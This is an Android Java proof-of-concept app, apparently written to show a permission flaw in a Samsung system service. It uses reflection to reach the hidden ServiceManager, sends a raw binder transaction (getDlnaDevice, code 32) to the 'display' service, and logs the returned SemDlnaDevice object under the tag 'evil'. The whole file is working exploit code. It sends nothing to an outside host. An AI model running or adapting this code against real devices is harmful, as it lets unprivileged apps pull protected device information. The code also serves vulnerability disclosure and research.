package poc.app;

import android.app.Activity;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.os.Parcelable;
import android.util.Log;

public class MainActivity extends Activity {
    static final int TRANSACTION_getDlnaDevice = 32;

    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        try {
            IBinder binder = getService("display");

            Parcel parcel = Parcel.obtain();
            parcel.writeInterfaceToken(binder.getInterfaceDescriptor());

            Parcel reply = Parcel.obtain();
            binder.transact(TRANSACTION_getDlnaDevice, parcel, reply, 0);
            reply.readException();

            if (reply.readBoolean()) {
                Parcelable.Creator creator = (Parcelable.Creator) Class.forName("android.hardware.display.SemDlnaDevice")
                        .getField("CREATOR").get(null);
                Log.d("evil", "Reply: " + creator.createFromParcel(reply));
            } else {
                Log.d("evil", "Reply: null");
            }
        } catch (Throwable th) {
            throw new RuntimeException(th);
        }
    }

    private IBinder getService(String name) throws Throwable {
        return (IBinder) Class.forName("android.os.ServiceManager")
                .getDeclaredMethod("getServiceOrThrow", String.class)
                .invoke(null, name);
    }
}